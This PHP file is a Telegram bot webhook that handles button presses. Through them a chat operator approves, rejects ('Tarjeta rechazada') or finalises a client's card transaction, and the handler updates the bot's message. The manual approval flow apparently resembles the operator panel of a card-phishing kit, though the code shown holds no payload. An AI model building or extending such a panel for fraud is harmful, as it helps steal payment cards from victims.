<?php
header('Content-Type: application/json; charset=utf-8');
require_once __DIR__ . '/functions.php';

$raw = file_get_contents('php://input');
$update = json_decode($raw, true);

if (!$update) {
    echo json_encode(['ok' => true, 'msg' => 'Webhook listening']);
    exit;
}

if (!empty($update['callback_query'])) {
    $cq = $update['callback_query'];
    $cqId = $cq['id'];
    $data = $cq['data'] ?? '';
    $msg = $cq['message'] ?? null;
    $chatId = $msg['chat']['id'] ?? get_chat_id();
    $msgId = $msg['message_id'] ?? null;

    if (strpos($data, 'continuar_') === 0 || $data === 'continuar') {
        $id = str_replace('continuar_', '', $data) ?: get_active_id();
        set_tx_status($id, 'continue');

        tg_request('answerCallbackQuery', [
            'callback_query_id' => $cqId,
            'text' => '✅ Aprobado. El cliente avanza a Confirmar.'
        ]);

        if ($msgId) {
            tg_request('editMessageReplyMarkup', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'reply_markup' => [
                    'inline_keyboard' => [
                        [['text' => '✅ CONTINUADO (Confirmar)', 'callback_data' => 'noop']]
                    ]
                ]
            ]);
        }
    } elseif (strpos($data, 'error_') === 0 || $data === 'error') {
        $id = str_replace('error_', '', $data) ?: get_active_id();
        set_tx_status($id, 'error');

        tg_request('answerCallbackQuery', [
            'callback_query_id' => $cqId,
            'text' => '❌ Tarjeta rechazada.'
        ]);

        if ($msgId) {
            tg_request('editMessageReplyMarkup', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'reply_markup' => [
                    'inline_keyboard' => [
                        [['text' => '❌ RECHAZADA', 'callback_data' => 'noop']]
                    ]
                ]
            ]);
        }
    } elseif (strpos($data, 'confirmar_again_') === 0 || $data === 'confirmar_again') {
        $id = str_replace('confirmar_again_', '', $data) ?: get_active_id();
        set_tx_status($id, 'confirmado_final');

        tg_request('answerCallbackQuery', [
            'callback_query_id' => $cqId,
            'text' => '✅ Confirmado finalizado con éxito.'
        ]);

        if ($msgId) {
            tg_request('editMessageReplyMarkup', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'reply_markup' => [
                    'inline_keyboard' => [
                        [['text' => '✅ FINALIZADO', 'callback_data' => 'noop']]
                    ]
                ]
            ]);
        }
    } else {
        tg_request('answerCallbackQuery', [
            'callback_query_id' => $cqId,
            'text' => 'Acción recibida'
        ]);
    }
}

echo json_encode(['ok' => true]);
